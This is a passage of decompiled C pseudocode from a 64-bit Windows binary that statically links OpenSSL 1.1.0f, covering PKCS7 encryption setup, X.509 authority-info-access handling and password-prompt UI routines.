  v10 = sub_14002C260(*(_QWORD *)(a1 + 24));
  *(_DWORD *)(a1 + 12) = 0;
  if ( v10 != 21 )
  {
    if ( v10 != 22 )
    {
      switch ( v10 )
      {
        case 23:
          v16 = *(_QWORD *)(a1 + 32);
          v17 = *(_QWORD *)(v16 + 16);
          v7 = *(unsigned int **)(v16 + 8);
          v5 = *(unsigned int **)(v17 + 24);
          v37 = *(char ****)(v17 + 8);
          if ( v5 )
            goto LABEL_20;
          Src = 247;
          break;
        case 24:
          v14 = *(_QWORD **)(a1 + 32);
          v7 = (unsigned int *)v14[6];
          v6 = (unsigned int *)v14[1];
          v15 = v14[5];
          v5 = *(unsigned int **)(v15 + 24);
          v37 = *(char ****)(v15 + 8);
          if ( v5 )
            goto LABEL_20;
          Src = 238;
          break;
        case 25:
          v11 = *(_QWORD *)(a1 + 32);
          v12 = *(_QWORD *)(v11 + 8);
          v13 = *(_QWORD *)(v11 + 16);
          *(_QWORD *)v36 = v12;
          goto LABEL_19;
        default:
          sub_140024610(33, 105, 112, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\pkcs7\\pk7_doit.c", 258);
LABEL_55:
          sub_140029C60((__int64)v2);
          sub_140029C60(v4);
          return 0i64;
      }
      sub_140024610(33, 105, 116, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\pkcs7\\pk7_doit.c", Src);
      goto LABEL_55;
    }
    v18 = *(_QWORD *)(a1 + 32);
    v6 = *(unsigned int **)(v18 + 8);
    v13 = *(_QWORD *)(v18 + 40);
LABEL_19:
    v38 = sub_1400C0B20(v13);
  }
LABEL_20:
  v19 = 0;
  if ( (int)sub_1400296E0(v6) > 0 )
  {
    while ( 1 )
    {
      v20 = (__int64 *)sub_140029880((__int64)v6, v19);
      if ( !(unsigned int)sub_1400BFFF0(&v35, v20) )
        goto LABEL_30;
      if ( ++v19 >= (int)sub_1400296E0(v6) )
      {
        v2 = v35;
        break;
      }
    }
  }
  if ( *(_QWORD *)v36 )
  {
    if ( !(unsigned int)sub_1400BFFF0(&v35, *(__int64 **)v36) )
    {
LABEL_30:
      v2 = v35;
      goto LABEL_55;
    }
    v2 = v35;
  }
  if ( v5 )
  {
    v21 = sub_1400BFD90();
    v22 = sub_140029FE0((__int64)v21);
    v4 = (__int64)v22;
    if ( !v22 )
    {
      sub_140024610(33, 105, 32, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\pkcs7\\pk7_doit.c", 276);
      goto LABEL_55;
    }
    sub_140029A90(v22, 0x81u, 0, (__int64)v36);
    v23 = (int)sub_140024EB0((__int64)v5);
    LODWORD(v35) = sub_140024EA0((__int64)v5);
    v24 = sub_140024FD0(v5);
    v25 = sub_14002C0F0(v24);
    v26 = v37;
    *v37 = v25;
    if ( (int)v35 > 0 && (int)sub_140025460((__int64)v39, (unsigned int)v35) <= 0 )
      goto LABEL_55;
    if ( (int)sub_14001B7A0(*(_DWORD **)v36, (int *)v5, 0i64, 0i64, 0i64, 1) <= 0
      || (int)sub_14001B550(*(unsigned int **)v36, (__int64)v40) <= 0
      || (int)sub_14001B7A0(*(_DWORD **)v36, 0i64, 0i64, (__int64)v40, v39, 1) <= 0 )
    {
      goto LABEL_55;
    }
    if ( (int)v35 > 0 )
    {
      if ( !v26[1] )
      {
        v27 = sub_14004FF40();
        v26[1] = (char **)v27;
        if ( !v27 )
          goto LABEL_55;
      }
      if ( (int)sub_140024EC0(*(_BYTE **)v36, (__int64)v26[1]) < 0 )
        goto LABEL_55;
    }
    v28 = 0;
    if ( (int)sub_1400296E0(v7) > 0 )
    {
      do
      {
        v29 = sub_140029880((__int64)v7, v28);
        if ( (int)sub_1400C0DB0(v29, (__int64)v40, v23) <= 0 )
          goto LABEL_55;
      }
      while ( ++v28 < (int)sub_1400296E0(v7) );
    }
    sub_140023440((__int64)v40, v23);
    if ( v2 )
      sub_14002A140(v2, v4);
    else
      v2 = (__int64 *)v4;
  }
  if ( !a2 )
  {
    if ( (unsigned int)sub_14002C260(*(_QWORD *)(a1 + 24)) == 22 && (unsigned int)sub_14007F370(a1, 2, 0) )
    {
      v30 = sub_1400BEE00();
      v31 = sub_140029FE0((__int64)v30);
    }
    else
    {
      if ( !v38 || *(int *)v38 <= 0 )
      {
LABEL_54:
        v32 = sub_1400BEAF0();
        v33 = sub_140029FE0((__int64)v32);
        v4 = 0i64;
        a2 = (__int64)v33;
        if ( !v33 )
          goto LABEL_55;
        sub_140029A90(v33, 0x82u, 0, 0i64);
        goto LABEL_57;
      }
      v31 = sub_1400BEA20(*(_BYTE **)(v38 + 8), *(_DWORD *)v38);
    }
    a2 = (__int64)v31;
    if ( v31 )
      goto LABEL_57;
    goto LABEL_54;
  }
LABEL_57:
  if ( !v2 )
    return (__int64 *)a2;
  sub_14002A140(v2, a2);
  return v2;
}

//----- (00000001400C0A40) ----------------------------------------------------
int **__fastcall sub_1400C0A40(__int64 *a1, int *a2, int a3)
{
  int **v5; // rbx
  unsigned int *v6; // rax
  int *v7; // rax

  v5 = sub_140029B70(a2, 520);
  if ( v5 )
  {
    while ( 1 )
    {
      sub_140029A90(v5, 0x78u, 0, (__int64)a1);
      if ( !*a1 )
        break;
      v6 = (unsigned int *)sub_1400252A0(*a1);
      if ( (unsigned int)sub_14001D4F0(v6) == a3 )
        return v5;
      v7 = (int *)sub_14002A130((__int64)v5);
      v5 = sub_140029B70(v7, 520);
      if ( !v5 )
        goto LABEL_5;
    }
    sub_140024610(33, 127, 68, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\pkcs7\\pk7_doit.c", 599);
  }
  else
  {
LABEL_5:
    sub_140024610(33, 127, 108, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\pkcs7\\pk7_doit.c", 594);
  }
  return 0i64;
}

//----- (00000001400C0B20) ----------------------------------------------------
__int64 __fastcall sub_1400C0B20(__int64 a1)
{
  __int64 v3; // rax

  if ( (unsigned int)sub_14002C260(*(_QWORD *)(a1 + 24)) == 21 )
    return *(_QWORD *)(a1 + 32);
  if ( (unsigned int)sub_14002C260(*(_QWORD *)(a1 + 24)) - 21 > 5 )
  {
    v3 = *(_QWORD *)(a1 + 32);
    if ( v3 )
    {
      if ( *(_DWORD *)v3 == 4 )
        return *(_QWORD *)(v3 + 8);
    }
  }
  return 0i64;
}

//----- (00000001400C0B80) ----------------------------------------------------
__int64 __fastcall sub_1400C0B80(int **a1, unsigned int a2, int a3, __int64 a4)
{
  int *v6; // rcx
  int *v9; // rax
  int v11; // ebx
  unsigned int *v12; // rsi
  __int64 v13; // rax
  __int64 v14; // rax
  unsigned int *v15; // rbx
  __int64 v16; // rax
  unsigned int *v17; // rsi

  v6 = *a1;
  if ( !v6 )
  {
    v9 = (int *)sub_1400296C0();
    *a1 = v9;
    if ( !v9 )
      return 0i64;
LABEL_7:
    v14 = sub_14002DDA0(a2, a3, a4);
    v15 = (unsigned int *)v14;
    if ( !v14 )
      return 0i64;
    if ( !(unsigned int)sub_1400297C0(*a1, v14) )
    {
      sub_14002DE60(v15);
      return 0i64;
    }
    return 1i64;
  }
  v11 = 0;
  if ( (int)sub_1400296E0((unsigned int *)v6) <= 0 )
    goto LABEL_7;
  while ( 1 )
  {
    v12 = (unsigned int *)sub_140029880((__int64)*a1, v11);
    v13 = sub_1400252A0((__int64)v12);
    if ( (unsigned int)sub_14002C260(v13) == a2 )
      break;
    if ( ++v11 >= (int)sub_1400296E0((unsigned int *)*a1) )
      goto LABEL_7;
  }
  sub_14002DE60(v12);
  v16 = sub_14002DDA0(a2, a3, a4);
  v17 = (unsigned int *)v16;
  if ( !v16 )
    return 0i64;
  if ( !sub_1400297E0((__int64)*a1, v11, v16) )
  {
    sub_14002DE60(v17);
    return 0i64;
  }
  return 1i64;
}

//----- (00000001400C0C90) ----------------------------------------------------
_BOOL8 __fastcall sub_1400C0C90(__int64 a1, __int64 *a2)
{
  unsigned int *v2; // rbx
  int v5; // eax
  __int64 v6; // rax
  int v8[4]; // [rsp+30h] [rbp-68h] BYREF
  char v9[64]; // [rsp+40h] [rbp-58h] BYREF

  v2 = *(unsigned int **)(a1 + 24);
  v5 = sub_1400ACA30(v2, 0x34u, -1);
  v6 = sub_1400AC9E0(v2, v5);
  if ( !sub_1400AECC0(v6, 0) && !(unsigned int)sub_1400C46A0(a1, 0i64) )
  {
    sub_140024610(33, 136, 65, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\pkcs7\\pk7_doit.c", 617);
    return 0i64;
  }
  if ( (unsigned int)sub_14006DA80(a2, (__int64)v9, v8) )
  {
    if ( !(unsigned int)sub_1400C4710(a1, v9, v8[0]) )
    {
      sub_140024610(33, 136, 65, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\pkcs7\\pk7_doit.c", 628);
      return 0i64;
    }
    return (unsigned int)sub_1400BFDA0(a1) != 0;
  }
  else
  {
    sub_140024610(33, 136, 6, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\pkcs7\\pk7_doit.c", 624);
    return 0i64;
  }
}
// 1400C0C90: using guessed type int var_68[4];

//----- (00000001400C0DB0) ----------------------------------------------------
__int64 *__fastcall sub_1400C0DB0(__int64 a1, __int64 a2, int a3)
{
  __int64 v4; // r14
  unsigned int v5; // esi
  void *v6; // rbx
  __int64 *result; // rax
  __int64 *v9; // rdi
  void *v10; // rax
  size_t v11; // [rsp+50h] [rbp+8h] BYREF

  v4 = a3;
  v5 = 0;
  v6 = 0i64;
  result = (__int64 *)sub_14005EFC0(*(_QWORD *)(a1 + 32));
  if ( result )
  {
    result = sub_140020770((__int64)result, 0i64);
    v9 = result;
    if ( result )
    {
      if ( (int)sub_140020FE0(result) > 0 )
      {
        if ( (int)sub_140020440(v9, -1, 256, 3u, 0, a1) > 0 )
        {
          if ( (int)sub_140020E90(v9, 0i64, &v11, a2, v4) > 0 )
          {
            v10 = sub_14001D8E0(v11);
            v6 = v10;
            if ( v10 )
            {
              if ( (int)sub_140020E90(v9, (__int64)v10, &v11, a2, v4) > 0 )
              {
                sub_1400476D0(*(_QWORD *)(a1 + 24), (__int64)v6, v11);
                v6 = 0i64;
                v5 = 1;
              }
            }
            else
            {
              sub_140024610(33, 132, 65, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\pkcs7\\pk7_doit.c", 120);
            }
          }
        }
        else
        {
          sub_140024610(33, 132, 152, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\pkcs7\\pk7_doit.c", 110);
        }
      }
      sub_140020670(v9);
      sub_14001D930(v6);
      return (__int64 *)v5;
    }
  }
  return result;
}

//----- (00000001400C0F30) ----------------------------------------------------
__int64 __fastcall sub_1400C0F30(__int64 a1, __int64 a2, char a3)
{
  return sub_1400C0FC0(*(_DWORD *)(a1 + 24), a2, a3 | 0x18u);
}

//----- (00000001400C0F50) ----------------------------------------------------
__int64 __fastcall sub_1400C0F50(__int64 a1, __int64 a2, char a3)
{
  return sub_1400C0FC0(*(_DWORD *)(a1 + 24), a2, a3 & 0xE7);
}

//----- (00000001400C0F70) ----------------------------------------------------
__int64 __fastcall sub_1400C0F70(__int64 a1, __int64 a2, char a3)
{
  __int64 result; // rax

  sub_140060BB0(a2, -1, 0);
  if ( (a3 & 4) != 0 )
    return 3i64;
  result = 1i64;
  if ( (*(_DWORD *)(a2 + 192) & 0x2000) == 0 )
    return 3i64;
  return result;
}

//----- (00000001400C0FC0) ----------------------------------------------------
__int64 __fastcall sub_1400C0FC0(int a1, __int64 a2, char a3)
{
  unsigned int **v3; // rbx
  unsigned int *v7; // rcx
  int v8; // edi
  int v9; // esi
  __int64 v10; // rax
  int v11; // eax
  __int64 v12; // rax
  int v13; // eax
  __int64 result; // rax

  v3 = *(unsigned int ***)(a2 + 296);
  if ( !v3 )
    goto LABEL_22;
  v7 = v3[1];
  v8 = 0;
  if ( v7 )
  {
    v9 = 0;
    if ( (int)sub_1400296E0(v7) > 0 )
    {
      do
      {
        v10 = sub_140029880((__int64)v3[1], v9);
        v11 = sub_14002C260(v10);
        if ( v11 == a1 || v11 == 910 && (a3 & 0x10) != 0 )
          return 2i64;
      }
      while ( ++v9 < (int)sub_1400296E0(v3[1]) );
    }
  }
  if ( *v3 )
  {
    if ( (int)sub_1400296E0(*v3) <= 0 )
      return 2i64;
    while ( 1 )
    {
      v12 = sub_140029880((__int64)*v3, v8);
      v13 = sub_14002C260(v12);
      if ( v13 == a1 || v13 == 910 && (a3 & 0x10) != 0 )
        break;
      if ( ++v8 >= (int)sub_1400296E0(*v3) )
        return 2i64;
    }
    return 1i64;
  }
  else
  {
LABEL_22:
    if ( (a3 & 8) == 0 )
      return 3i64;
    sub_140060BB0(a2, -1, 0);
    if ( (a3 & 4) != 0 )
      return 3i64;
    result = 1i64;
    if ( (*(_DWORD *)(a2 + 192) & 0x2000) == 0 )
      return 3i64;
  }
  return result;
}

//----- (00000001400C10E0) ----------------------------------------------------
void *sub_1400C10E0()
{
  return &unk_140123880;
}

//----- (00000001400C10F0) ----------------------------------------------------
void *sub_1400C10F0()
{
  return &unk_1401238D0;
}

//----- (00000001400C1100) ----------------------------------------------------
int *__fastcall sub_1400C1100(__int64 a1, unsigned int *a2, int *a3)
{
  int *v6; // rsi
  int v7; // r14d
  __int64 v8; // rbx
  int *v9; // rax
  __int64 v10; // rbp
  unsigned int v11; // ecx
  char *i; // rdx
  _BYTE *v13; // rdx
  unsigned int j; // eax
  size_t v15; // rdi
  _BYTE *v16; // rax
  _BYTE *v17; // rbx
  char v19[80]; // [rsp+30h] [rbp-98h] BYREF

  v6 = a3;
  v7 = 0;
  if ( (int)sub_1400296E0(a2) <= 0 )
  {
LABEL_11:
    if ( a3 || v6 )
      return v6;
    else
      return (int *)sub_1400296C0();
  }
  else
  {
    while ( 1 )
    {
      v8 = sub_140029880((__int64)a2, v7);
      v9 = sub_1400BB240(a1, *(int **)(v8 + 8), v6);
      if ( !v9 )
        break;
      v6 = v9;
      v10 = sub_140029880((__int64)v9, v7);
      sub_14003FE60(v19, 80, *(_QWORD *)v8);
      v11 = 0;
      for ( i = v19; *i; ++v11 )
      {
        if ( v11 >= 0x80000000 )
          break;
        ++i;
      }
      v13 = *(_BYTE **)(v10 + 8);
      for ( j = 0; *v13; ++j )
      {
        if ( j >= 0x80000000 )
          break;
        ++v13;
      }
      v15 = (int)((j & 0x7FFFFFFF) + 5 + (v11 & 0x7FFFFFFF));
      v16 = sub_14001D8E0(v15);
      v17 = v16;
      if ( !v16 )
        break;
      sub_14003C060(v16, v19, v15);
      sub_14003BFE0(v17, " - ", v15);
      sub_14003BFE0(v17, *(_BYTE **)(v10 + 8), v15);
      sub_14001D930(*(void **)(v10 + 8));
      *(_QWORD *)(v10 + 8) = v17;
      if ( ++v7 >= (int)sub_1400296E0(a2) )
        goto LABEL_11;
    }
    sub_140024610(34, 138, 65, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\x509v3\\v3_info.c", 97);
    if ( !a3 && v6 )
      sub_140029720(v6, (void (*)(void))sub_1400B8520);
    return 0i64;
  }
}

//----- (00000001400C12E0) ----------------------------------------------------
int *__fastcall sub_1400C12E0(__int64 a1, __int64 a2, unsigned int *a3)
{
  int *v6; // r15
  int v8; // esi
  __int64 v9; // rbx
  __int64 v10; // rax
  _QWORD *v11; // rdi
  char *v12; // rax
  int v13; // ebp
  char *v14; // rax
  char *v15; // rbx
  char **v16; // rax
  int v17; // [rsp+20h] [rbp-58h]
  char v18[8]; // [rsp+30h] [rbp-48h] BYREF
  char *v19; // [rsp+38h] [rbp-40h]
  __int64 v20; // [rsp+40h] [rbp-38h]

  v6 = (int *)sub_1400296C0();
  if ( v6 )
  {
    v8 = 0;
    if ( (int)sub_1400296E0(a3) <= 0 )
    {
      return v6;
    }
    else
    {
      while ( 1 )
      {
        v9 = sub_140029880((__int64)a3, v8);
        v10 = sub_140050B70((__int64)&unk_140123880);
        v11 = (_QWORD *)v10;
        if ( !v10 || !(unsigned int)sub_1400297C0(v6, v10) )
          break;
        v12 = strchr(*(const char **)(v9 + 8), 59);
        if ( !v12 )
        {
          sub_140024610(34, 139, 143, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\x509v3\\v3_info.c", 130);
          goto LABEL_18;
        }
        v13 = (_DWORD)v12 - *(_DWORD *)(v9 + 8);
        v19 = v12 + 1;
        v20 = *(_QWORD *)(v9 + 16);
        if ( !sub_1400BB5F0(v11[1], a1, a2, (__int64)v18, 0) )
          goto LABEL_18;
        v14 = sub_14003BBE0(*(_BYTE **)(v9 + 8), v13);
        v15 = v14;
        if ( !v14 )
        {
          v17 = 140;
          goto LABEL_17;
        }
        v16 = sub_14002C840(v14, 0);
        *v11 = v16;
        if ( !v16 )
        {
          sub_140024610(34, 139, 119, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\x509v3\\v3_info.c", 146);
          sub_140023A40(2, "value=", v15);
          sub_14001D930(v15);
          goto LABEL_18;
        }
        sub_14001D930(v15);
        if ( ++v8 >= (int)sub_1400296E0(a3) )
          return v6;
      }
      v17 = 124;
LABEL_17:
      sub_140024610(34, 139, 65, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\x509v3\\v3_info.c", v17);
LABEL_18:
      sub_140029720(v6, (void (*)(void))sub_1400C1530);
      return 0i64;
    }
  }
  else
  {
    sub_140024610(34, 139, 65, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\x509v3\\v3_info.c", 116);
    return 0i64;
  }
}
// 1400C12E0: using guessed type char var_48[8];

//----- (00000001400C1530) ----------------------------------------------------
void __fastcall sub_1400C1530(unsigned int *a1)
{
  sub_140051250(a1, (__int64)&unk_140123880);
}

//----- (00000001400C1550) ----------------------------------------------------
__int64 __fastcall sub_1400C1550(__int64 a1, __int64 a2, int a3, __int64 a4, int a5, int a6)
{
  int v6; // eax
  void **v8; // rdi
  _QWORD *v9; // rax
  __int64 result; // rax
  int v11; // ebx

  v8 = (void **)sub_1400C1C90(a1, a2, 0, v6 - 47, a3, a4);
  if ( !v8 )
    return 0xFFFFFFFFi64;
  if ( !*(_QWORD *)(a1 + 8) )
  {
    v9 = sub_1400296C0();
    *(_QWORD *)(a1 + 8) = v9;
    if ( !v9 )
    {
      sub_1400C1C00(v8);
      return 0xFFFFFFFFi64;
    }
  }
  *((_DWORD *)v8 + 8) = a5;
  *((_DWORD *)v8 + 9) = a6;
  v8[5] = 0i64;
  result = sub_1400297C0(*(int **)(a1 + 8), (__int64)v8);
  v11 = result;
  if ( (int)result <= 0 )
  {
    sub_1400C1C00(v8);
    return (unsigned int)(v11 - 1);
  }
  return result;
}
// 1400C1570: variable 'v6' is possibly undefined

//----- (00000001400C15F0) ----------------------------------------------------
__int64 __fastcall sub_1400C15F0(__int64 a1, __int64 a2, int a3, __int64 a4, int a5, int a6, void *a7)
{
  int v7; // eax
  void **v9; // rdi
  _QWORD *v10; // rax
  __int64 result; // rax
  int v12; // ebx

  v9 = (void **)sub_1400C1C90(a1, a2, 0, v7 - 46, a3, a4);
  if ( !v9 )
    return 0xFFFFFFFFi64;
  if ( !*(_QWORD *)(a1 + 8) )
  {
    v10 = sub_1400296C0();
    *(_QWORD *)(a1 + 8) = v10;
    if ( !v10 )
    {
      sub_1400C1C00(v9);
      return 0xFFFFFFFFi64;
    }
  }
  *((_DWORD *)v9 + 8) = a5;
  *((_DWORD *)v9 + 9) = a6;
  v9[5] = a7;
  result = sub_1400297C0(*(int **)(a1 + 8), (__int64)v9);
  v12 = result;
  if ( (int)result <= 0 )
  {
    sub_1400C1C00(v9);
    return (unsigned int)(v12 - 1);
  }
  return result;
}
// 1400C1610: variable 'v7' is possibly undefined

//----- (00000001400C1690) ----------------------------------------------------
void __fastcall sub_1400C1690(__int64 a1)
{
  if ( a1 )
  {
    sub_140029720(*(void **)(a1 + 8), (void (*)(void))sub_1400C1C00);
    sub_140025FB0(0xBu, a1, (__int64 *)(a1 + 24));
    sub_140025BE0(*(_DWORD **)(a1 + 40));
    sub_14001D930((void *)a1);
  }
}

//----- (00000001400C16F0) ----------------------------------------------------
__int64 __fastcall sub_1400C16F0(__int64 a1)
{
  if ( *(_DWORD *)a1 == 3 )
    return *(_QWORD *)(a1 + 32);
  else
    return 0i64;
}

//----- (00000001400C1700) ----------------------------------------------------
__int64 __fastcall sub_1400C1700(__int64 a1)
{
  if ( (unsigned int)(*(_DWORD *)a1 - 1) > 1 )
    return 0i64;
  else
    return *(_QWORD *)(a1 + 24);
}

//----- (00000001400C1720) ----------------------------------------------------
__int64 __fastcall sub_1400C1720(__int64 a1)
{
  if ( *(_DWORD *)a1 == 2 )
    return *(_QWORD *)(a1 + 40);
  else
    return 0i64;
}

//----- (00000001400C1730) ----------------------------------------------------
__int64 *sub_1400C1730()
{
  return sub_1400C1750(0i64);
}

//----- (00000001400C1750) ----------------------------------------------------
__int64 *__fastcall sub_1400C1750(__int64 a1)
{
  unsigned int v1; // eax
  __int64 *v3; // rbx
  _DWORD *v5; // rax
  char **v6; // rax

  v3 = (__int64 *)sub_14001DC20(v1);
  if ( !v3 )
  {
    sub_140024610(40, 104, 65, (unsigned int)"..\\..\\openssl-1.1.0f\\crypto\\ui\\ui_lib.c", 30);
    return 0i64;
  }
  v5 = sub_140025C10();
  v3[5] = (__int64)v5;
  if ( !v5 )
  {
    sub_140024610(40, 104, 65, (unsigned int)"..\\..\\openssl-1.1.0f\\crypto\\ui\\ui_lib.c", 36);
LABEL_5:
    sub_14001D930(v3);
    return 0i64;
  }
  if ( a1 )
  {
    *v3 = a1;
  }
  else
  {
    v6 = (char **)qword_140143508;
    if ( !qword_140143508 )
    {
      v6 = sub_1400C69B0();
      qword_140143508 = (__int64)v6;
    }
    *v3 = (__int64)v6;
  }
  if ( !(unsigned int)sub_140026350(0xBu, (__int64)v3, v3 + 3) )
    goto LABEL_5;
  return v3;
}
// 1400C176A: variable 'v1' is possibly undefined
// 140024610: using guessed type __int64 __fastcall sub_140024610(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 140143508: using guessed type __int64 qword_140143508;

//----- (00000001400C1850) ----------------------------------------------------
__int64 __fastcall sub_1400C1850(__int64 a1)
{
  const char *v1; // rbp
  int (*v3)(void); // rdx
  unsigned int v4; // edi
  int v5; // esi
  __int64 v6; // rax
  __int64 (__fastcall *v7)(__int64); // rdx
  int v8; // eax
  int v9; // esi
  __int64 v10; // rax
  int v11; // eax
  int (__fastcall *v12)(__int64); // rdx

  v1 = "processing";
  v3 = *(int (**)(void))(*(_QWORD *)a1 + 8i64);
  if ( v3 && v3() <= 0 )
  {
    v1 = "opening session";
    v4 = -1;
  }
  else
  {
    if ( (*(_DWORD *)(a1 + 32) & 0x100) != 0 )
      sub_1400ABFB0((struct _exception *)sub_1400C1D70, a1);
    v4 = 0;
    v5 = 0;
    if ( (int)sub_1400296E0(*(unsigned int **)(a1 + 8)) <= 0 )
    {
LABEL_10:
      v7 = *(__int64 (__fastcall **)(__int64))(*(_QWORD *)a1 + 24i64);
      if ( !v7 )
        goto LABEL_15;
      v8 = v7(a1);
      if ( v8 == -1 )
      {
LABEL_22:
        v4 = -2;
        goto LABEL_23;
      }
      if ( v8 )
      {
LABEL_15:
        v9 = 0;
        if ( (int)sub_1400296E0(*(unsigned int **)(a1 + 8)) > 0 )
        {
          while ( 1 )
          {
            if ( *(_QWORD *)(*(_QWORD *)a1 + 32i64) )
            {
              v10 = sub_140029880(*(_QWORD *)(a1 + 8), v9);
              v11 = (*(__int64 (__fastcall **)(__int64, __int64))(*(_QWORD *)a1 + 32i64))(a1, v10);
              if ( v11 == -1 )
                goto LABEL_22;
              if ( !v11 )
                break;
            }
            if ( ++v9 >= (int)sub_1400296E0(*(unsigned int **)(a1 + 8)) )
              goto LABEL_23;
          }
          v1 = "reading strings";
          v4 = -1;
        }
      }
      else
      {
        v1 = "flushing";
        v4 = -1;
      }
    }
    else
    {
      while ( 1 )
      {
        if ( *(_QWORD *)(*(_QWORD *)a1 + 16i64) )
        {
          v6 = sub_140029880(*(_QWORD *)(a1 + 8), v5);
          if ( (*(int (__fastcall **)(__int64, __int64))(*(_QWORD *)a1 + 16i64))(a1, v6) <= 0 )
            break;
        }
        if ( ++v5 >= (int)sub_1400296E0(*(unsigned int **)(a1 + 8)) )
          goto LABEL_10;
      }
      v1 = "writing strings";
      v4 = -1;
    }
  }
LABEL_23:
  v12 = *(int (__fastcall **)(__int64))(*(_QWORD *)a1 + 40i64);
  if ( v12 && v12(a1) <= 0 )
  {
    v4 = -1;
LABEL_27:
    sub_140024610(40, 113, 107, (unsigned int)"..\\..\\openssl-1.1.0f\\crypto\\ui\\ui_lib.c", 493);
    sub_140023A40(2, "while ", v1);
    return v4;
  }
  if ( v4 == -1 )
    goto LABEL_27;
  return v4;
}
// 140024610: using guessed type __int64 __fastcall sub_140024610(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD);

//----- (00000001400C19F0) ----------------------------------------------------
__int64 __fastcall sub_1400C19F0(__int64 a1, __int64 a2, _BYTE *a3)
{
  unsigned int v3; // esi
  _BYTE *v4; // rbx
  _BYTE *i; // rax
  int v8; // esi
  int v9; // eax
  _BYTE *v10; // rax
  __int16 v12; // r8
  int v13; // eax
  _BYTE *v14; // rcx
  int v15; // [rsp+20h] [rbp-58h]
  char v16[16]; // [rsp+30h] [rbp-48h] BYREF
  char v17[16]; // [rsp+40h] [rbp-38h] BYREF

  v3 = 0;
  v4 = a3;
  for ( i = a3; *i; ++v3 )
  {
    if ( v3 >= 0x80000000 )
      break;
    ++i;
  }
  *(_DWORD *)(a1 + 32) &= ~1u;
  v8 = v3 & 0x7FFFFFFF;
  v9 = *(_DWORD *)a2;
  if ( *(int *)a2 > 0 )
  {
    if ( v9 > 2 )
    {
      if ( v9 == 3 )
      {
        v10 = *(_BYTE **)(a2 + 24);
        if ( !v10 )
        {
          sub_140024610(40, 105, 105, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\ui\\ui_lib.c", 805);
          return 0xFFFFFFFFi64;
        }
        *v10 = 0;
        if ( *a3 )
        {
          while ( !strchr(*(const char **)(a2 + 40), (char)*v4) )
          {
            if ( strchr(*(const char **)(a2 + 48), (char)*v4) )
            {
              **(_BYTE **)(a2 + 24) = **(_BYTE **)(a2 + 48);
              return 0i64;
            }
            if ( !*++v4 )
              return 0i64;
          }
          **(_BYTE **)(a2 + 24) = **(_BYTE **)(a2 + 40);
        }
      }
      return 0i64;
    }
    sub_14002A5C0(v17, 0xDui64, "%d", *(unsigned int *)(a2 + 32));
    sub_14002A5C0(v16, 0xDui64, "%d", *(unsigned int *)(a2 + 36));
    if ( v8 < *(_DWORD *)(a2 + 32) )
    {
      v15 = 778;
      v12 = 101;
LABEL_18:
      *(_DWORD *)(a1 + 32) |= 1u;
      sub_140024610(40, 105, v12, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\ui\\ui_lib.c", v15);
      sub_140023A40(5, "You must type in ", v17, " to ", v16, " characters");
      return 0xFFFFFFFFi64;
    }
    v13 = *(_DWORD *)(a2 + 36);
    if ( v8 > v13 )
    {
      v15 = 785;
      v12 = 100;
      goto LABEL_18;
    }
    v14 = *(_BYTE **)(a2 + 24);
    if ( !v14 )
    {
      sub_140024610(40, 105, 105, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\ui\\ui_lib.c", 793);
      return 0xFFFFFFFFi64;
    }
    sub_14003C060(v14, v4, v13 + 1);
  }
  return 0i64;
}

//----- (00000001400C1C00) ----------------------------------------------------
void __fastcall sub_1400C1C00(void **a1)
{
  if ( ((_BYTE)a1[7] & 1) != 0 )
  {
    sub_14001D930(a1[1]);
    if ( *(_DWORD *)a1 == 3 )
    {
      sub_14001D930(a1[4]);
      sub_14001D930(a1[5]);
      sub_14001D930(a1[6]);
    }
  }
  sub_14001D930(a1);
}

//----- (00000001400C1C90) ----------------------------------------------------
_QWORD *__fastcall sub_1400C1C90(__int64 a1, __int64 a2, int a3, int a4, int a5, __int64 a6)
{
  int v6; // eax
  int v7; // ebx
  _QWORD *result; // rax

  v7 = 0;
  if ( a2 )
  {
    if ( (unsigned int)(a4 - 1) > 2 || a6 )
    {
      result = sub_14001D8E0(0x40ui64);
      if ( result )
      {
        result[1] = a2;
        LOBYTE(v7) = a3 != 0;
        *((_DWORD *)result + 4) = a5;
        *((_DWORD *)result + 14) = v7;
        *(_DWORD *)result = a4;
        result[3] = a6;
      }
    }
    else
    {
      sub_140024610(40, 109, 105, (unsigned int)"..\\..\\openssl-1.1.0f\\crypto\\ui\\ui_lib.c", 102);
      return 0i64;
    }
  }
  else
  {
    sub_140024610(v6 - 8, v6 + 61, v6 + 19, (unsigned int)"..\\..\\openssl-1.1.0f\\crypto\\ui\\ui_lib.c", 99);
    return 0i64;
  }
  return result;
}
// 1400C1CD0: variable 'v6' is possibly undefined
// 140024610: using guessed type __int64 __fastcall sub_140024610(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD);

//----- (00000001400C1D70) ----------------------------------------------------
__int64 __fastcall sub_1400C1D70(__int64 a1, __int64 a2, __int64 *a3)
{
  __int64 v3; // rax
  int (__fastcall *v4)(__int64 *, __int64 *); // r9
  __int64 v6[9]; // [rsp+20h] [rbp-48h] BYREF

  v6[1] = a1;
  v6[0] = 0i64;
  memset(&v6[2], 0, 48);
  v3 = *a3;
  LODWORD(v6[0]) = 5;
  v4 = *(int (__fastcall **)(__int64 *, __int64 *))(v3 + 16);
  if ( v4 && v4(a3, v6) <= 0 )
    return 0xFFFFFFFFi64;
  else
    return 0i64;
}

//----- (00000001400C1DE0) ----------------------------------------------------
void *sub_1400C1DE0()
{
  return &unk_140123AE0;
}

//----- (00000001400C1DF0) ----------------------------------------------------
void *sub_1400C1DF0()
{
  return &unk_140123B30;
}

//----- (00000001400C1E00) ----------------------------------------------------
